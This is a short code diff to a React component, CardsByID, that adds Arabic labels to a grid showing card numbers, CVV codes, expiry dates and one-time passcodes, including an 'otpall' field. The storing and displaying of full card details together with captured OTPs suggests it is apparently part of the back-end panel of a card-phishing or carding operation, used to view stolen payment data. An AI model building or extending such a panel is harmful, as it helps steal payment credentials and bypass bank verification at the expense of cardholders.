@@ -60,13 +60,15 @@ export function CardsByID({ id }: { id: string }) {
 
   return (
     <div className="grid grid-cols-1 md:grid-cols-2 lg:grid-cols-3 gap-4">
-      <span>{cards.cardNumber}</span>
-      <span>{cards.cvc}</span>
-      <span>{cards.month}</span>
-      <span>{cards.yaer}</span>
-      <span>{cards.otp}</span>
-      <span>{cards.prefix}</span>
-      <span>{cards.otpall}</span>
+      <span>رقم pref:{cards.prefix}</span>
+
+      <span>رقم البطاقه:{cards.cardNumber}</span>
+      
+      <span>cvv:{cards.cvc}</span>
+      <span>ٍشهر{cards.month}</span>
+      <span>سنه{cards.yaer}</span>
+      <span>: تحقق{cards.otp}</span>
+      <span>تحقق الكل: {cards.otpall}</span>
       {/* Add more spans for other card fields as needed */}
     </div>
   )
